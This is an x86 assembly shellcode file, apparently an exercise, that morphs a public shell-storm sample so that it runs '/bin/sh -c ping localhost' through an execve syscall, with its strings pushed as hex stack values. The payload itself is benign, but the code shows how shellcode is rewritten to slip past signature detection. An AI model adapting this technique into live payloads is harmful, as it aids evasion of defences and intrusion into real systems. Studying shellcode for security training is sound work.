; Content:	morphed code (ping localhost) from http://shell-storm.org/shellcode/files/shellcode-632.php
; Author: 	Florian Hansemann | @HanseSecure | https://hansesecure.de
; Date: 	10/2017
;


global	_start			

section	.text

_start:

	push	0xb	
	pop	eax
	cdq				
	push	edx
	push	0x74736f	; modified "ping localhost" -> //bin////ping localhost
	push	0x686c6163	; 
	push	0x6f6c2067	;	
	push	0x6e69702f	;
	push	0x2f2f2f6e	;	
	push	0x69622f2f	;
	mov	esi, esp
	push	edx
	push	word 0x632d
	mov	ecx, esp
	push	edx
	push	0x68732f2f
	push	0x6e69622f
	mov	ebx, esp
	push	edx
	push	esi
	push	ecx
	push	ebx
	mov	ecx, esp
	int	0x80
